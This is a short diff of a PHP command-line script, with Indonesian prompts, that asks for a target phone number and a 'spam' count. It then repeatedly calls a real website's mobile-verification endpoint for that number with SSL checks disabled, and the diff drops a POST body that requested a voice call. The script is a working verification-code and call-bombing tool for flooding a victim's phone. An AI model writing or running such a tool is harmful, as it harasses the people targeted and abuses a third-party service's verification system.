@@ -7,20 +7,11 @@ $target = trim(fgets(STDIN));
 echo "masukan jumlah spam : ";
 $jm = trim(fgets(STDIN));
 
-$data = <<<DATA
-{
-    "method": "CALL",
-    "countryCode": "id"
-}
-DATA;
-
 
 for ($i = 0; $i < $jm; $i++){
     echo "waiting api nya agak sedikit lemot...." . PHP_EOL;
     $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL,"https://id.jagreward.com/member/verify-mobile/$target");
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS,$data );
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
